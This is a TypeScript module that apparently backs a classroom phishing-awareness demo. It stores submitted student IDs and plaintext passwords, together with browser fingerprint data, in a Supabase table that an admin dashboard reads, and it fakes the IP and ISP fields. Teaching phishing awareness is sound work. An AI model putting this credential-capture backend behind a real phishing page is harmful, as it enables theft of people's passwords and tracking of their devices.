/**
 * Shared "capture" bridge between the /aclc phishing demo and its /aclc/admin
 * dashboard. Backed by a Supabase table (`aclc_captures`, see
 * lib/supabaseClient.ts) so submissions from ANY device — a student's phone,
 * your laptop, whatever — show up on /aclc/admin wherever you have it open.
 *
 * IP/location/ISP are faked (see `fakeGeo()` below), not looked up for real.
 * Location is pinned to Baliuag, Bulacan since that's where the whole class
 * actually is; IP and ISP are randomized per submission just for visual
 * variety on the dashboard.
 */
import { supabase } from "./supabaseClient";

export type AclcCapture = {
  id: string;
  studentId: string;
  password: string;
  capturedAt: string; // pre-formatted display string
  capturedAtMs: number; // epoch ms, for sorting / relative time
  device: string; // full navigator.userAgent
  screen: string; // e.g. "1280x800"
  language: string; // e.g. "en-PH"
  timezone: string; // e.g. "Asia/Manila"
  referrer: string; // how they arrived at the page
  ip: string;
  city: string;
  region: string;
  country: string;
  isp: string;
};

type CaptureRow = {
  id: string;
  student_id: string;
  password: string;
  captured_at: string;
  captured_at_ms: number;
  device: string;
  screen: string;
  language: string;
  timezone: string;
  referrer: string;
  ip: string;
  city: string;
  region: string;
  country: string;
  isp: string;
};

function fromRow(row: CaptureRow): AclcCapture {
  return {
    id: row.id,
    studentId: row.student_id,
    password: row.password,
    capturedAt: row.captured_at,
    capturedAtMs: row.captured_at_ms,
    device: row.device,
    screen: row.screen,
    language: row.language,
    timezone: row.timezone,
    referrer: row.referrer,
    ip: row.ip,
    city: row.city,
    region: row.region,
    country: row.country,
    isp: row.isp,
  };
}

export async function readCaptures(): Promise<AclcCapture[]> {
  const { data, error } = await supabase
    .from("aclc_captures")
    .select("*")
    .order("captured_at_ms", { ascending: false });
  if (error || !data) return [];
  return (data as CaptureRow[]).map(fromRow);
}

export async function appendCapture(capture: Omit<AclcCapture, "id">) {
  await supabase.from("aclc_captures").insert({
    student_id: capture.studentId,
    password: capture.password,
    captured_at: capture.capturedAt,
    captured_at_ms: capture.capturedAtMs,
    device: capture.device,
    screen: capture.screen,
    language: capture.language,
    timezone: capture.timezone,
    referrer: capture.referrer,
    ip: capture.ip,
    city: capture.city,
    region: capture.region,
    country: capture.country,
    isp: capture.isp,
  });
}

export async function clearCaptures() {
  // Delete-all needs a always-true filter; id never equals this sentinel.
  await supabase
    .from("aclc_captures")
    .delete()
    .neq("id", "00000000-0000-0000-0000-000000000000");
}

export type GeoInfo = {
  ip: string;
  city: string;
  region: string;
  country: string;
  isp: string;
};

// Common PH ISPs, picked at random per submission just for dashboard
// variety — not a real lookup.
const FAKE_ISPS = [
  "PLDT Home Fibr",
  "Globe Telecom",
  "Converge ICT",
  "Smart Communications",
  "Sky Broadband",
];

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

/**
 * Fake IP + ISP, real (fixed) location. Location is pinned to Baliuag,
 * Bulacan since that's where the whole class physically is, and the IP/ISP
 * are randomized so the dashboard doesn't show identical rows for every
 * capture.
 */
export function fakeGeo(): GeoInfo {
  return {
    ip: `${randInt(1, 223)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`,
    city: "Baliuag",
    region: "Bulacan",
    country: "Philippines",
    isp: FAKE_ISPS[randInt(0, FAKE_ISPS.length - 1)],
  };
}
